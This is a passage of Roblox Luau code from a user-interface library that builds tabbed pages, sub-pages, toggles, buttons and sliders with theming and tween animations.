                        PaddingLeft = UDimNew(0, 7)
                    })

                    Instances:Create("UIListLayout", {
                        Parent = Items["SubPages"].Instance,
                        Name = "\0",
                        VerticalAlignment = Enum.VerticalAlignment.Center,
                        FillDirection = Enum.FillDirection.Horizontal,
                        Padding = UDimNew(0, 12),
                        SortOrder = Enum.SortOrder.LayoutOrder
                    })

                    Items["Columns"] = Instances:Create("Frame", {
                        Parent = Items["Page"].Instance,
                        Name = "\0",
                        BackgroundTransparency = 1,
                        Position = UDim2New(0, 0, 0, 51),
                        BorderColor3 = FromRGB(42, 49, 45),
                        Size = UDim2New(1, 0, 1, -51),
                        BorderSizePixel = 0,
                        BackgroundColor3 = FromRGB(255, 255, 255)
                    })
                else
                    Instances:Create("UIListLayout", {
                        Parent = Items["Page"].Instance,
                        Name = "\0",
                        FillDirection = Enum.FillDirection.Horizontal,
                        HorizontalFlex = Enum.UIFlexAlignment.Fill,
                        Padding = UDimNew(0, 14),
                        SortOrder = Enum.SortOrder.LayoutOrder
                    })

                    for Index = 1, Data.Columns do 
                        local NewColumn = Instances:Create("ScrollingFrame", {
                            Parent = Items["Page"].Instance,
                            Name = "\0",
                            ScrollBarImageColor3 = FromRGB(0, 0, 0),
                            Active = true,
                            AutomaticCanvasSize = Enum.AutomaticSize.Y,
                            ScrollBarThickness = 0,
                            BackgroundTransparency = 1,
                            Size = UDim2New(1, 0, 1, 0),
                            BackgroundColor3 = FromRGB(255, 255, 255),
                            BorderColor3 = FromRGB(0, 0, 0),
                            BorderSizePixel = 0,
                            CanvasSize = UDim2New(0, 0, 0, 0)
                        })

                        Instances:Create("UIPadding", {
                            Parent = NewColumn.Instance,
                            Name = "\0",
                            PaddingTop = UDimNew(0, 2),
                            PaddingBottom = UDimNew(0, 2),
                            PaddingRight = UDimNew(0, 2),
                            PaddingLeft = UDimNew(0, 2)
                        })

                        Instances:Create("UIListLayout", {
                            Parent = NewColumn.Instance,
                            Name = "\0",
                            Padding = UDimNew(0, 14),
                            SortOrder = Enum.SortOrder.LayoutOrder
                        })

                        Page.ColumnsData[Index] = NewColumn
                    end
                end

                Page.Items = Items
            end

            local Debounce = false

            function Page:Turn(Bool)
                if Debounce then 
                    return 
                end

                Page.Active = Bool 
                
                Debounce = true
                Items["Page"].Instance.Visible = Bool 
                Items["Page"].Instance.Parent = Bool and Data.ContentHolder.Instance or Library.UnusedHolder.Instance

                if Page.Active then
                    Items["Inactive"]:Tween(nil, {BackgroundTransparency = 0})
                    Items["ButtonBorder"]:Tween(nil, {Transparency = 0})
                    Items["Glow"]:Tween(nil, {BackgroundTransparency = 0})
                    Items["Liner"]:Tween(nil, {BackgroundTransparency = 0})
                    Items["Text"]:Tween(nil, {Position = UDim2New(0, 13, 0.5, 0)})

                    Library.CurrentPage = Page
                else
                    Items["Inactive"]:Tween(nil, {BackgroundTransparency = 0.6})
                    Items["ButtonBorder"]:Tween(nil, {Transparency = 0.6})
                    Items["Glow"]:Tween(nil, {BackgroundTransparency = 1})
                    Items["Liner"]:Tween(nil, {BackgroundTransparency = 1})
                    Items["Text"]:Tween(nil, {Position = UDim2New(0, 8, 0.5, 0)})
                end

                local AllInstances = Items["Page"].Instance:GetDescendants()
                TableInsert(AllInstances, Items["Page"].Instance)
                
                local NewTween 

                for Index, Value in AllInstances do 
                    local TransparencyProperty = Tween:GetProperty(Value)

                    if not TransparencyProperty then 
                        continue
                    end

                    if type(TransparencyProperty) == "table" then 
                        for _, Property in TransparencyProperty do 
                            NewTween = Tween:FadeItem(Value, Property, Bool, Data.Window.FadeTime)
                        end
                    else
                        NewTween = Tween:FadeItem(Value, TransparencyProperty, Bool, Data.Window.FadeTime)
                    end
                end

                Library:Connect(NewTween.Tween.Completed, function()
                    Debounce = false
                end)
            end

            Items["Inactive"]:Connect("MouseButton1Down", function()
                for Index, Value in Data.Window.Pages do 
                    if Value == Page and Page.Active then
                        return
                    end

                    Value:Turn(Value == Page)
                end
            end)

            Items["Inactive"]:OnHover(function()
                Items["Inactive"]:ChangeItemTheme({BackgroundColor3 = "Hovered Element", BorderColor3 = "Border"})
                Items["Inactive"]:Tween(nil, {BackgroundColor3 = Library.Theme["Hovered Element"]})
            end)

            Items["Inactive"]:OnHoverLeave(function()
                Items["Inactive"]:ChangeItemTheme({BackgroundColor3 = "Page Background", BorderColor3 = "Border"})
                Items["Inactive"]:Tween(nil, {BackgroundColor3 = Library.Theme["Page Background"]})
            end)

            if #Data.Window.Pages == 0 then 
                Page:Turn(true)
            end

            TableInsert(Data.Window.Pages, Page)
            return Page, Items 
        end

        Components.WindowSubPage = function(self, Data)
            local SubPage = {
                Active = false,
                ColumnsData = { }
            }

            local Items = { } do
                Items["Inactive"] = Instances:Create("TextButton", {
                    Parent = Data.Page.Items["SubPages"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(0, 0, 0),
                    BorderColor3 = FromRGB(12, 12, 12),
                    Text = "",
                    AutoButtonColor = false,
                    BackgroundTransparency = 1,
                    Size = UDim2New(0, 0, 0, 20),
                    BorderSizePixel = 2,
                    AutomaticSize = Enum.AutomaticSize.X,
                    TextSize = 14,
                    BackgroundColor3 = FromRGB(25, 30, 26)
                })  Items["Inactive"]:AddToTheme({BackgroundColor3 = "Page Background", BorderColor3 = "Border"})

                Items["ButtonBorder"] = Instances:Create("UIStroke", {
                    Parent = Items["Inactive"].Instance,
                    Name = "\0",
                    Color = FromRGB(61, 60, 65),
                    Transparency = 1,
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                })  Items["ButtonBorder"]:AddToTheme({Color = "Outline"})

                Items["Text"] = Instances:Create("TextLabel", {
                    Parent = Items["Inactive"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = Data.Name,
                    AnchorPoint = Vector2New(0.5, 0.5),
                    Size = UDim2New(0, 0, 0, 15),
                    BackgroundTransparency = 1,
                    Position = UDim2New(0.5, -5, 0.5, 0),
                    BorderSizePixel = 0,
                    AutomaticSize = Enum.AutomaticSize.X,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Text"]:AddToTheme({TextColor3 = "Text"})

                Items["TextStroke"] = Items["Text"]:TextBorder()

                Instances:Create("UIPadding", {
                    Parent = Items["Text"].Instance,
                    Name = "\0",
                    PaddingRight = UDimNew(0, 8),
                    PaddingLeft = UDimNew(0, 8)
                })

                Instances:Create("UIPadding", {
                    Parent = Items["Inactive"].Instance,
                    Name = "\0",
                    PaddingTop = UDimNew(0, 2),
                    PaddingLeft = UDimNew(0, 18),
                    PaddingRight = UDimNew(0, 12)
                })

                Items["Glow"] = Instances:Create("Frame", {
                    Parent = Items["Inactive"].Instance,
                    Name = "\0",
                    BackgroundTransparency = 1,
                    Position = UDim2New(0, -18, 0, -2),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(0, 20, 1, 2),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(202, 243, 255)
                })  Items["Glow"]:AddToTheme({BackgroundColor3 = "Accent"})

                Instances:Create("UIGradient", {
                    Parent = Items["Glow"].Instance,
                    Name = "\0",
                    Transparency = NumSequence{NumSequenceKeypoint(0, 0), NumSequenceKeypoint(0.193, 0.8687499761581421), NumSequenceKeypoint(0.504, 0.96875), NumSequenceKeypoint(1, 1)}
                })

                Items["Liner"] = Instances:Create("Frame", {
                    Parent = Items["Inactive"].Instance,
                    Name = "\0",
                    BackgroundTransparency = 1,
                    Position = UDim2New(0, -18, 0, -2),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(0, 1, 1, 2),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(202, 243, 255)
                })  Items["Liner"]:AddToTheme({BackgroundColor3 = "Accent"})

                Items["Page"] = Instances:Create("Frame", {
                    Parent = Data.Page.Items["Columns"].Instance,
                    Name = "\0",
                    BackgroundTransparency = 1,
                    Position = UDim2New(0, -2, 0, -2),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, 2, 1, 0),
                    BorderSizePixel = 0,
                    Visible = false,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Instances:Create("UIListLayout", {
                    Parent = Items["Page"].Instance,
                    Name = "\0",
                    FillDirection = Enum.FillDirection.Horizontal,
                    HorizontalFlex = Enum.UIFlexAlignment.Fill,
                    Padding = UDimNew(0, 14),
                    SortOrder = Enum.SortOrder.LayoutOrder
                })

                for Index = 1, Data.Columns do 
                    local NewColumn = Instances:Create("ScrollingFrame", {
                        Parent = Items["Page"].Instance,
                        Name = "\0",
                        ScrollBarImageColor3 = FromRGB(0, 0, 0),
                        Active = true,
                        AutomaticCanvasSize = Enum.AutomaticSize.Y,
                        ScrollBarThickness = 0,
                        BackgroundTransparency = 1,
                        Size = UDim2New(1, 0, 1, 0),
                        BackgroundColor3 = FromRGB(255, 255, 255),
                        BorderColor3 = FromRGB(0, 0, 0),
                        BorderSizePixel = 0,
                        CanvasSize = UDim2New(0, 0, 0, 0)
                    })

                    Instances:Create("UIPadding", {
                        Parent = NewColumn.Instance,
                        Name = "\0",
                        PaddingTop = UDimNew(0, 2),
                        PaddingBottom = UDimNew(0, 2),
                        PaddingRight = UDimNew(0, 2),
                        PaddingLeft = UDimNew(0, 2)
                    })

                    Instances:Create("UIListLayout", {
                        Parent = NewColumn.Instance,
                        Name = "\0",
                        Padding = UDimNew(0, 14),
                        SortOrder = Enum.SortOrder.LayoutOrder
                    })

                    SubPage.ColumnsData[Index] = NewColumn
                end
            end

            local Debounce = false

            Library.SearchItems[SubPage] = { }

            function SubPage:Turn(Bool)
                if Debounce then 
                    return 
                end

                SubPage.Active = Bool 
                Debounce = true
                Items["Page"].Instance.Visible = Bool 
                Items["Page"].Instance.Parent = Bool and Data.Page.Items["Columns"].Instance or Library.UnusedHolder.Instance

                if SubPage.Active then
                    Items["Inactive"]:Tween(nil, {BackgroundTransparency = 0})
                    Items["ButtonBorder"]:Tween(nil, {Transparency = 0})
                    Items["Liner"]:Tween(nil, {BackgroundTransparency = 0})
                    Items["Glow"]:Tween(nil, {BackgroundTransparency = 0})
                    Items["Text"]:Tween(nil, {Position = UDim2New(0.5, 0, 0.5, 0)})

                    Library.CurrentPage = SubPage
                else
                    Items["Inactive"]:Tween(nil, {BackgroundTransparency = 1})
                    Items["ButtonBorder"]:Tween(nil, {Transparency = 1})
                    Items["Liner"]:Tween(nil, {BackgroundTransparency = 1})
                    Items["Glow"]:Tween(nil, {BackgroundTransparency = 1})
                    Items["Text"]:Tween(nil, {Position = UDim2New(0.5, -5, 0.5, 0)})
                end

                local AllInstances = Items["Page"].Instance:GetDescendants()
                TableInsert(AllInstances, Items["Page"].Instance)

                local NewTween 

                for Index, Value in AllInstances do 
                    local TransparencyProperty = Tween:GetProperty(Value)

                    if not TransparencyProperty then 
                        continue
                    end

                    if type(TransparencyProperty) == "table" then 
                        for _, Property in TransparencyProperty do 
                            NewTween = Tween:FadeItem(Value, Property, Bool, Data.Window.FadeTime)
                        end
                    else
                        NewTween = Tween:FadeItem(Value, TransparencyProperty, Bool, Data.Window.FadeTime)
                    end
                end

                Library:Connect(NewTween.Tween.Completed, function()
                    Debounce = false
                end)
            end

            Items["Inactive"]:Connect("MouseButton1Down", function()
                for Index, Value in Data.Page.SubPages do 
                    if Value == SubPage and SubPage.Active then
                        return
                    end

                    Value:Turn(Value == SubPage)
                end
            end)

            if #Data.Page.SubPages == 0 then 
                SubPage:Turn(true)
            end

            TableInsert(Data.Page.SubPages, SubPage)
            return SubPage
        end

        Components.Toggle = function(self, Data)
            local Toggle = {
                Value = false,
                Flag = Data.Flag
            }
            
            local Items = { } do
                Items["Toggle"] = Instances:Create("TextButton", {
                    Parent = Data.Parent.Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(0, 0, 0),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = "",
                    AutoButtonColor = false,
                    BackgroundTransparency = 1,
                    Size = UDim2New(1, 0, 0, 12),
                    BorderSizePixel = 0,
                    TextSize = 14,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Items["Indicator"] = Instances:Create("Frame", {
                    Parent = Items["Toggle"].Instance,
                    Name = "\0",
                    AnchorPoint = Vector2New(0, 0.5),
                    Position = UDim2New(0, 0, 0.5, 0),
                    BorderColor3 = FromRGB(12, 12, 12),
                    Size = UDim2New(0, 12, 0, 12),
                    BorderSizePixel = 2,
                    BackgroundColor3 = FromRGB(30, 36, 31)
                })  Items["Indicator"]:AddToTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})

                Instances:Create("UIStroke", {
                    Parent = Items["Indicator"].Instance,
                    Name = "\0",
                    Color = FromRGB(42, 49, 45),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Outline"})

                Instances:Create("UIGradient", {
                    Parent = Items["Indicator"].Instance,
                    Name = "\0",
                    Rotation = -165,
                    Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, FromRGB(208, 208, 208))}
                }):AddToTheme({Color = function()
                    return RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, Library.Theme.Gradient)}
                end})

                Items["Check"] = Instances:Create("ImageLabel", {
                    Parent = Items["Indicator"].Instance,
                    Name = "\0",
                    ImageColor3 = FromRGB(0, 0, 0),
                    ScaleType = Enum.ScaleType.Fit,
                    ImageTransparency = 1,
                    BorderColor3 = FromRGB(0, 0, 0),
                    AnchorPoint = Vector2New(0.5, 0.5),
                    Image = "rbxassetid://108016671469439",
                    BackgroundTransparency = 1,
                    Position = UDim2New(0.5, 0, 0.5, 0),
                    Size = UDim2New(1, 2, 1, 2),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Items["Text"] = Instances:Create("TextLabel", {
                    Parent = Items["Toggle"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = Data.Name,
                    Size = UDim2New(0, 0, 0, 15),
                    AnchorPoint = Vector2New(0, 0.5),
                    Position = UDim2New(0, 22, 0.5, 0),
                    BackgroundTransparency = 1,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    BorderSizePixel = 0,
                    AutomaticSize = Enum.AutomaticSize.X,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Text"]:AddToTheme({TextColor3 = "Text"})

                Items["Text"]:TextBorder()

                Items["SubElements"] = Instances:Create("Frame", {
                    Parent = Items["Toggle"].Instance,
                    Name = "\0",
                    BorderColor3 = FromRGB(0, 0, 0),
                    BackgroundTransparency = 1,
                    Position = UDim2New(0, Items["Text"].Instance.TextBounds.X + 30, 0, 0),
                    Size = UDim2New(0, 0, 1, 0),
                    BorderSizePixel = 0,
                    AutomaticSize = Enum.AutomaticSize.X,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Instances:Create("UIListLayout", {
                    Parent = Items["SubElements"].Instance,
                    Name = "\0",
                    VerticalAlignment = Enum.VerticalAlignment.Center,
                    FillDirection = Enum.FillDirection.Horizontal,
                    Padding = UDimNew(0, 6),
                    SortOrder = Enum.SortOrder.LayoutOrder
                })
            end
            
            function Toggle:Get()
                return Toggle.Value 
            end

            function Toggle:SetText(Text)
                Text = tostring(Text)
                Items["Text"].Instance.Text = Text
            end

            function Toggle:Set(Value)
                Toggle.Value = Value 
                Library.Flags[Toggle.Flag] = Value 

                if Toggle.Value then
                    Items["Indicator"]:ChangeItemTheme({BackgroundColor3 = "Accent", BorderColor3 = "Border"})
                    Items["Indicator"]:Tween(nil, {BackgroundColor3 = Library.Theme.Accent})
                    task.wait(0.05)
                    Items["Check"]:Tween(TweenInfo.new(Library.Tween.Time, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {ImageTransparency = 0, Size = UDim2New(1, 2, 1, 2)})
                else
                    Items["Indicator"]:ChangeItemTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})
                    Items["Indicator"]:Tween(nil, {BackgroundColor3 = Library.Theme.Element})
                    task.wait(0.05)
                    Items["Check"]:Tween(TweenInfo.new(Library.Tween.Time, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {ImageTransparency = 1, Size = UDim2New(0, 0, 0, 0)})
                end

                if Data.Callback then 
                    Library:SafeCall(Data.Callback, Toggle.Value)
                end
            end

            function Toggle:SetVisibility(Bool)
                Items["Toggle"].Instance.Visible = Bool 
            end

            local PageSearchData = Library.SearchItems[Data.Page]

            if PageSearchData then
                local SearchData = {
                    Element = Items["Toggle"],
                    Name = Data.Name,
                }

                TableInsert(PageSearchData, SearchData)
            end

            Items["Toggle"]:Connect("MouseButton1Down", function()
                Toggle:Set(not Toggle.Value)
            end)

            Items["Toggle"]:OnHover(function()
                if Toggle.Value then 
                    return 
                end

                Items["Indicator"]:ChangeItemTheme({BackgroundColor3 = "Hovered Element", BorderColor3 = "Border"})
                Items["Indicator"]:Tween(nil, {BackgroundColor3 = Library.Theme["Hovered Element"]})
            end)

            Items["Toggle"]:OnHoverLeave(function()
                if Toggle.Value then 
                    return 
                end

                Items["Indicator"]:ChangeItemTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})
                Items["Indicator"]:Tween(nil, {BackgroundColor3 = Library.Theme["Element"]})
            end)

            Toggle:Set(Data.Default)

            Library.SetFlags[Toggle.Flag] = function(Value)
                Toggle:Set(Value)
            end

            return Toggle, Items
        end

        Components.Button = function(self, Data)
            local Button = { }

            local Items = { } do
                Items["Button"] = Instances:Create("Frame", {
                    Parent = Data.Parent.Instance,
                    Name = "\0",
                    BackgroundTransparency = 1,
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, 0, 0, 0),
                    BorderSizePixel = 0,
                    AutomaticSize = Enum.AutomaticSize.Y,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Instances:Create("UIListLayout", {
                    Parent = Items["Button"].Instance,
                    Name = "\0",
                    FillDirection = Enum.FillDirection.Horizontal,
                    HorizontalFlex = Enum.UIFlexAlignment.Fill,
                    Padding = UDimNew(0, 8),
                    SortOrder = Enum.SortOrder.LayoutOrder
                })
            end

            function Button:Add(Name, Callback)
                local NewButton = { }

                local SubItems = { } do
                    SubItems["NewButton"] = Instances:Create("TextButton", {
                        Parent = Items["Button"].Instance,
                        Name = "\0",
                        FontFace = Library.Font,
                        TextColor3 = FromRGB(0, 0, 0),
                        BorderColor3 = FromRGB(12, 12, 12),
                        Text = "",
                        AutoButtonColor = false,
                        Size = UDim2New(1, 0, 0, 20),
                        BorderSizePixel = 2,
                        TextSize = 14,
                        BackgroundColor3 = FromRGB(30, 36, 31)
                    })  SubItems["NewButton"]:AddToTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})

                    Instances:Create("UIGradient", {
                        Parent = SubItems["NewButton"].Instance,
                        Name = "\0",
                        Rotation = -165,
                        Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, FromRGB(208, 208, 208))}
                    }):AddToTheme({Color = function()
                        return RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, Library.Theme.Gradient)}
                    end})

                    Instances:Create("UIStroke", {
                        Parent = SubItems["NewButton"].Instance,
                        Name = "\0",
                        Color = FromRGB(42, 49, 45),
                        LineJoinMode = Enum.LineJoinMode.Miter,
                        ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                    }):AddToTheme({Color = "Outline"})

                    SubItems["Text"] = Instances:Create("TextLabel", {
                        Parent = SubItems["NewButton"].Instance,
                        Name = "\0",
                        FontFace = Library.Font,
                        TextColor3 = FromRGB(235, 235, 235),
                        BorderColor3 = FromRGB(0, 0, 0),
                        Text = Name,
                        BackgroundTransparency = 1,
                        Size = UDim2New(1, 0, 1, 0),
                        BorderSizePixel = 0,
                        TextSize = 9,
                        BackgroundColor3 = FromRGB(255, 255, 255)
                    })  SubItems["Text"]:AddToTheme({TextColor3 = "Text"})

                    SubItems["Text"]:TextBorder()
                end

                function NewButton:Press()
                    SubItems["NewButton"]:ChangeItemTheme({BackgroundColor3 = "Accent", BorderColor3 = "Border"})
                    SubItems["NewButton"]:Tween(nil, {BackgroundColor3 = Library.Theme.Accent})

                    Library:SafeCall(Callback)
                    task.wait(0.1)

                    SubItems["NewButton"]:ChangeItemTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})
                    SubItems["NewButton"]:Tween(nil, {BackgroundColor3 = Library.Theme.Element})
                end

                function NewButton:SetVisibility(Bool)
                    SubItems["NewButton"].Instance.Visible = Bool
                end

                local PageSearchData = Library.SearchItems[Data.Page]

                if PageSearchData then
                    local SearchData = {
                        Element = SubItems["NewButton"],
                        Name = Name,
                    }

                    TableInsert(PageSearchData, SearchData)
                end

                SubItems["NewButton"]:OnHover(function()
                    SubItems["NewButton"]:ChangeItemTheme({BackgroundColor3 = "Hovered Element", BorderColor3 = "Border"})
                    SubItems["NewButton"]:Tween(nil, {BackgroundColor3 = Library.Theme["Hovered Element"]})
                end)

                SubItems["NewButton"]:OnHoverLeave(function()
                    SubItems["NewButton"]:ChangeItemTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})
                    SubItems["NewButton"]:Tween(nil, {BackgroundColor3 = Library.Theme.Element})
                end)

                SubItems["NewButton"]:Connect("MouseButton1Down", function()
                    NewButton:Press()
                end)

                return NewButton 
            end

            function Button:SetVisibility(Bool)
                Items["Button"].Instance.Visible = Bool
            end

            return Button, Items
        end

        Components.Slider = function(self, Data)
            local Slider = {
                Value = 0,
                Flag = Data.Flag,
                Sliding = false
            }

            local Items = { } do
                Items["Slider"] = Instances:Create("Frame", {
                    Parent = Data.Parent.Instance,
                    Name = "\0",
                    BackgroundTransparency = 1,
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, 0, 0, 28),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Items["Text"] = Instances:Create("TextLabel", {
                    Parent = Items["Slider"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = Data.Name,
                    BackgroundTransparency = 1,
                    Size = UDim2New(0, 0, 0, 15),
                    BorderSizePixel = 0,
                    AutomaticSize = Enum.AutomaticSize.X,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Text"]:AddToTheme({TextColor3 = "Text"})

                Items["Text"]:TextBorder()

                Items["RealSlider"] = Instances:Create("TextButton", {
                    Parent = Items["Slider"].Instance,
                    AutoButtonColor = false,
                    Text = "",
                    Name = "\0",
                    AnchorPoint = Vector2New(0, 1),
                    Position = UDim2New(0, 0, 1, 0),
                    BorderColor3 = FromRGB(12, 12, 12),
                    Size = UDim2New(1, 0, 0, 10),
                    BorderSizePixel = 2,
                    BackgroundColor3 = FromRGB(30, 36, 31)
                })  Items["RealSlider"]:AddToTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})

                Instances:Create("UIGradient", {
                    Parent = Items["RealSlider"].Instance,
                    Name = "\0",
                    Rotation = -165,
                    Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, FromRGB(208, 208, 208))}
                }):AddToTheme({Color = function()
                    return RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, Library.Theme.Gradient)}
                end})

                Instances:Create("UIStroke", {
                    Parent = Items["RealSlider"].Instance,
                    Name = "\0",
                    Color = FromRGB(42, 49, 45),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Outline"})

                Items["Accent"] = Instances:Create("Frame", {
                    Parent = Items["RealSlider"].Instance,
                    Name = "\0",
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(0.5, 0, 1, 0),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(202, 243, 255)
                })  Items["Accent"]:AddToTheme({BackgroundColor3 = "Accent"})

                Instances:Create("UIGradient", {
                    Parent = Items["Accent"].Instance,
                    Name = "\0",
                    Rotation = -165,
                    Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, FromRGB(208, 208, 208))}
                }):AddToTheme({Color = function()
                    return RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, Library.Theme.Gradient)}
                end})

                Items["Dragger"] = Instances:Create("Frame", {
                    Parent = Items["Accent"].Instance,
                    Name = "\0",
                    AnchorPoint = Vector2New(1, 0.5),
                    Position = UDim2New(1, 0, 0.5, 0),
                    BorderColor3 = FromRGB(42, 49, 45),
                    Size = UDim2New(0, 3, 1, 3),
                    BorderSizePixel = 2,
                    BackgroundColor3 = FromRGB(14, 17, 15)
                })  Items["Dragger"]:AddToTheme({BackgroundColor3 = "Background", BorderColor3 = "Outline"})

                Instances:Create("UIStroke", {
                    Parent = Items["Dragger"].Instance,
                    Name = "\0",
                    Color = FromRGB(12, 12, 12),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Border"})

                Items["Value"] = Instances:Create("TextLabel", {
                    Parent = Items["Slider"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = "50%",
                    AnchorPoint = Vector2New(1, 0),
                    Size = UDim2New(0, 0, 0, 15),
                    BackgroundTransparency = 1,
                    Position = UDim2New(1, 0, 0, 0),
                    BorderSizePixel = 0,
                    AutomaticSize = Enum.AutomaticSize.X,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Value"]:AddToTheme({TextColor3 = "Text"})

                Items["Value"]:TextBorder()
            end

            function Slider:Get()
                return Slider.Value
            end

            function Slider:SetVisibility(Bool)
                Items["Slider"].Instance.Visible = Bool
            end

            function Slider:Set(Value)
                Slider.Value = Library:Round(MathClamp(Value, Data.Min, Data.Max), Data.Decimals)

                Library.Flags[Slider.Flag] = Slider.Value

                Items["Accent"]:Tween(TweenInfo.new(Library.Tween.Time, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2New((Slider.Value - Data.Min) / (Data.Max - Data.Min), 0, 1, 0)})
                Items["Value"].Instance.Text = StringFormat("%s%s", tostring(Slider.Value), Data.Suffix)

                if Data.Callback then 
                    Library:SafeCall(Data.Callback, Slider.Value)
                end
            end

            --[[
            local PageSearchData = Library.SearchItems[Data.Page]

            if PageSearchData then
                local SearchData = {
                    Element = Items["Slider"],
                    Name = Data.Name,
                }

                TableInsert(PageSearchData, SearchData)
            end
            --]]

            local InputChanged

            Items["RealSlider"]:Connect("InputBegan", function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
                    Slider.Sliding = true 

                    local SizeX = (Mouse.X - Items["RealSlider"].Instance.AbsolutePosition.X) / Items["RealSlider"].Instance.AbsoluteSize.X
                    local Value = ((Data.Max - Data.Min) * SizeX) + Data.Min

                    Slider:Set(Value)

                    if InputChanged then
                        return
                    end

                    InputChanged = Input.Changed:Connect(function()
                        if Input.UserInputState == Enum.UserInputState.End then
                            Slider.Sliding = false
                            
                            InputChanged:Disconnect()
                            InputChanged = nil
                        end
                    end)
                end
            end)

            Library:Connect(UserInputService.InputChanged, function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch then
                    if Slider.Sliding then
                        local SizeX = (Mouse.X - Items["RealSlider"].Instance.AbsolutePosition.X) / Items["RealSlider"].Instance.AbsoluteSize.X
                        local Value = ((Data.Max - Data.Min) * SizeX) + Data.Min

                        Slider:Set(Value)
                    end
                end
            end)

            Items["Slider"]:OnHover(function()
                Items["RealSlider"]:ChangeItemTheme({BackgroundColor3 = "Hovered Element", BorderColor3 = "Border"})
                Items["RealSlider"]:Tween(nil, {BackgroundColor3 = Library.Theme["Hovered Element"]})
            end)

            Items["Slider"]:OnHoverLeave(function()
                Items["RealSlider"]:ChangeItemTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})
                Items["RealSlider"]:Tween(nil, {BackgroundColor3 = Library.Theme["Element"]})
            end)

            if Data.Default then 
                Slider:Set(Data.Default)
            end

            Library.SetFlags[Slider.Flag] = function(Value)
                Slider:Set(Value)
            end

            return Slider, Items
        end

        Components.Label = function(self, Data)
            local Label = { }

            local Items = { } do
                Items["Label"] = Instances:Create("Frame", {
                    Parent = Data.Parent.Instance,
                    Name = "\0",
                    BackgroundTransparency = 1,
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, 0, 0, 20),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Items["Text"] = Instances:Create("TextLabel", {
                    Parent = Items["Label"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = Data.Name,
                    Size = UDim2New(0, 0, 0, 15),
                    AnchorPoint = Vector2New(0, 0.5),
